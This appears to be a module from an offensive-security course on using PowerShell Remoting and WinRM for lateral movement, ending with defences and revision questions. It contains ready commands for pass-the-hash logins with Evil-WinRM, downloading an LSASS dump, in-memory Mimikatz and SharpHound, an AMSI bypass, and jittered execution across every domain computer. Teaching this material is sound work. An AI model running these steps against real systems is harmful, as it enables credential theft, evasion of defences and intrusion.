# PowerShell Remoting

## Unit 6 - Topic 3 | Lateral Movement

---

## Overview

**PowerShell Remoting** (WinRM — Windows Remote Management) provides interactive PowerShell sessions on remote machines. It's a legitimate admin tool built into Windows, making it effective for lateral movement since the traffic blends with normal enterprise operations.

---

## 1. PowerShell Remoting Basics

```
WINRM ARCHITECTURE:

PORT 5985 (HTTP) / 5986 (HTTPS):

┌──────────┐    WS-Management    ┌──────────┐
│ Attacker │ ──────────────────→ │  Target  │
│          │    Port 5985/5986   │          │
│          │                     │          │
│ Enter-   │    PowerShell       │  WinRM   │
│ PSSession│    commands/output  │  Service │
│          │ ←────────────────── │  (wsmprovhost.exe)
└──────────┘                     └──────────┘

REQUIREMENTS:
├── WinRM service running on target (default on servers)
├── Target port 5985/5986 accessible
├── Admin credentials (or member of Remote Management Users)
├── Enabled by default on: Server 2012+, Windows 10+
└── Can be enabled: Enable-PSRemoting -Force

ADVANTAGES:
├── Full interactive PowerShell environment
├── Built-in Windows feature
├── Encrypted communication
├── Fan-out (execute on multiple hosts simultaneously)
├── File transfer capability
└── Session persistence (Disconnected Sessions)
```

---

## 2. PowerShell Remoting Commands

```powershell
# === INTERACTIVE SESSION ===
# Enter remote session:
Enter-PSSession -ComputerName target -Credential corp\admin
# Full interactive PS session on target
# [target]: PS C:\> whoami
# corp\admin

# With explicit credential:
$cred = Get-Credential    # Prompts for username/password
Enter-PSSession -ComputerName target -Credential $cred

# Exit session:
Exit-PSSession

# === INVOKE-COMMAND (Non-Interactive) ===
# Single command:
Invoke-Command -ComputerName target -Credential corp\admin \
  -ScriptBlock {whoami; hostname; ipconfig}

# Multiple hosts simultaneously:
Invoke-Command -ComputerName srv01,srv02,srv03 \
  -Credential corp\admin \
  -ScriptBlock {Get-Process | Where-Object {$_.CPU -gt 100}}

# Execute script file:
Invoke-Command -ComputerName target -Credential corp\admin \
  -FilePath C:\local\script.ps1

# === PERSISTENT SESSIONS ===
# Create persistent session (reuse connection):
$session = New-PSSession -ComputerName target \
  -Credential corp\admin

# Use the session:
Invoke-Command -Session $session -ScriptBlock {whoami}
Enter-PSSession -Session $session

# Copy files via session:
Copy-Item -Path C:\local\file.txt \
  -Destination C:\remote\file.txt \
  -ToSession $session

# Remove session:
Remove-PSSession -Session $session
```

---

## 3. Evil-WinRM (Offensive Tool)

```bash
# === EVIL-WINRM (Linux — Recommended for Pentesting) ===
# Basic authentication:
evil-winrm -i target -u admin -p password

# With NTLM hash (Pass-the-Hash):
evil-winrm -i target -u admin -H NTLM_HASH

# With Kerberos ticket:
KRB5CCNAME=admin.ccache evil-winrm -i target -r corp.local

# === EVIL-WINRM FEATURES ===
# Upload files:
*Evil-WinRM* PS > upload /local/path/file.exe C:\temp\file.exe

# Download files:
*Evil-WinRM* PS > download C:\temp\lsass.dmp /local/path/

# Load PowerShell scripts:
evil-winrm -i target -u admin -p pass -s /scripts/
*Evil-WinRM* PS > Invoke-Mimikatz.ps1
*Evil-WinRM* PS > Invoke-Mimikatz

# Load C# binaries (execute in memory):
evil-winrm -i target -u admin -p pass -e /binaries/
*Evil-WinRM* PS > Invoke-Binary SharpHound.exe -c all

# Bypass AMSI:
*Evil-WinRM* PS > Bypass-4MSI
# Attempts to bypass Anti-Malware Scan Interface

# === CRACKMAPEXEC (WinRM) ===
crackmapexec winrm target -u admin -p pass
crackmapexec winrm target -u admin -p pass -x "whoami"
crackmapexec winrm target -u admin -H NTLM_HASH
```

---

## 4. Advanced Remoting Techniques

```powershell
# === DOUBLE HOP PROBLEM ===
# Problem: From Host A → PS Remote to B → Try to access C
# Fails! Kerberos doesn't delegate by default.

# SOLUTIONS:

# 1. CredSSP (sends creds to remote — security risk):
Enable-WSManCredSSP -Role Client -DelegateComputer target
Enter-PSSession -ComputerName target -Credential corp\admin \
  -Authentication CredSSP

# 2. Invoke-Command with credential:
Invoke-Command -ComputerName target -Credential corp\admin \
  -ScriptBlock {
    $cred = New-Object PSCredential("corp\admin", (ConvertTo-SecureString "pass" -AsPlainText -Force))
    Invoke-Command -ComputerName target2 -Credential $cred \
      -ScriptBlock {whoami}
  }

# 3. Use Kerberos delegation (if configured)

# === CONSTRAINED LANGUAGE MODE BYPASS ===
# If target has CLM enabled:
$ExecutionContext.SessionState.LanguageMode
# "ConstrainedLanguage"

# Bypass via PSSession configuration:
# Register custom session configuration that allows Full Language
# Or use compiled C# tools instead of PowerShell scripts

# === JITTERED EXECUTION ===
# Spread commands across hosts with delays:
$computers = Get-ADComputer -Filter * | select -Expand Name
foreach ($comp in $computers) {
  Invoke-Command -ComputerName $comp -Credential $cred \
    -ScriptBlock {whoami} -AsJob
  Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 30)
}
Get-Job | Receive-Job
```

---

## 5. Defense Against PS Remoting Abuse

| Defense | Implementation |
|---------|---------------|
| **Restrict WinRM** | Allow only from admin subnets via GPO |
| **JEA** | Just Enough Administration — restrict available commands |
| **Logging** | Enable PowerShell ScriptBlock logging (Event 4104) |
| **Transcription** | Enable PowerShell transcription for audit trail |
| **AMSI** | Anti-Malware Scan Interface blocks malicious scripts |
| **CLM** | Constrained Language Mode limits PS capabilities |
| **Network rules** | Firewall block port 5985/5986 between workstations |

```powershell
# Enable script block logging:
# GPO: Admin Templates → Windows Components →
#      Windows PowerShell → Turn on Script Block Logging

# Enable transcription:
# GPO: Admin Templates → Windows Components →
#      Windows PowerShell → Turn on PowerShell Transcription
# Path: Set transcript output directory
```

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **WinRM** | Port 5985 (HTTP) / 5986 (HTTPS) |
| **Enter-PSSession** | Interactive remote PS session |
| **Invoke-Command** | Non-interactive, supports fan-out |
| **Evil-WinRM** | Offensive tool with upload/download/AMSI bypass |
| **Double hop** | Kerberos delegation issue on second hop |
| **Defense** | JEA, logging, CLM, network restrictions |

---

## Quick Revision Questions

1. **What ports does WinRM use?**
2. **What is the double hop problem and how do you solve it?**
3. **What advantages does Evil-WinRM offer over native PS remoting?**
4. **How does Just Enough Administration (JEA) help?**
5. **What PowerShell logging should be enabled for detection?**

---

[← Previous: WMI Exploitation](02-wmi-exploitation.md) | [Next: PsExec and Alternatives →](04-psexec-and-alternatives.md)

---

*Unit 6 - Topic 3 of 6 | [Back to README](../README.md)*
